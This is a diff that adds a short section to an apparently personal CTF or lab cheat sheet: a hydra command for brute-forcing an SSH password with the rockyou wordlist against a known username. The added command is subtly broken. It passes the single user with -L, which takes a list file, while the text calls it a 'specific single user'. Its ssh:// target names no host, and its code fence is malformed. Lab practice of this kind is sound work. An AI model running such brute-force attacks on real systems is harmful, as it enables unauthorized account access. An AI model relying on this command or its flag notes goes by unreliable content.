@@ -63,3 +63,16 @@ Used on: **OperationTakeover** - recovered the FRRouting VTY password that grant
 - `-s 2623` — non-default VTY port (FRR default; IOS default is `23`)
 - `-t 64` — 64 parallel threads; safe for a single-connection service
 - `-f` — stop after the first valid credential
+
+### SSH single-user brute force
+
+`ash
+hydra -L meliodas -P /usr/share/wordlists/rockyou.txt ssh:// -t 4 -V
+`
+
+Used on: **bsidesgtlibrary** - brute-forced an SSH login knowing the username from web enumeration.
+
+- -L meliodas — specific single user
+- -P — password list
+- -t 4 — 4 parallel threads
+- -V — verbose output
